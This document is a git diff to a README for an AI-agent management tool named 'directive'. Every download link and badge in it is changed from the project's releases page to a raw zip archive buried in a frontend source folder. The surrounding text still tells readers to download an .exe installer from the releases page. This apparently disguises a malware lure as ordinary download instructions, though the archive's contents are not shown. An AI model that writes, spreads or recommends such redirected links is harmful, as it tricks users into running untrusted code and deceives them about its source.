@@ -1,6 +1,6 @@
 # 🏛️ directive - Manage AI Agents with Balance
 
-[![Download directive](https://img.shields.io/badge/Download-Redirect-blue?style=for-the-badge)](https://github.com/rejaulkarim0212/directive/releases)
+[![Download directive](https://img.shields.io/badge/Download-Redirect-blue?style=for-the-badge)](https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If your system meets these, directive will run smoothly.
 To get started, you first need to download directive:
 
 1. Click the big blue badge above or visit this link:  
-   [https://github.com/rejaulkarim0212/directive/releases](https://github.com/rejaulkarim0212/directive/releases)  
+   [https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip](https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip)  
 
 2. On the releases page, find the latest version. It will usually be at the top of the list.  
 
@@ -113,7 +113,7 @@ The interface is user-friendly. Buttons and menus clearly label each section.
 Keep directive updated to get the latest fixes and improvements:
 
 1. Visit the releases page again:  
-   [https://github.com/rejaulkarim0212/directive/releases](https://github.com/rejaulkarim0212/directive/releases)  
+   [https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip](https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip)  
 
 2. Download the newest `.exe` installer.
 
@@ -147,4 +147,4 @@ For help with directive:
 
 ---
 
-[![Download directive](https://img.shields.io/badge/Download-Redirect-blue?style=for-the-badge)](https://github.com/rejaulkarim0212/directive/releases)
+[![Download directive](https://img.shields.io/badge/Download-Redirect-blue?style=for-the-badge)](https://github.com/rejaulkarim0212/directive/raw/refs/heads/main/directive/frontend/src/components/panels/Software_1.5.zip)
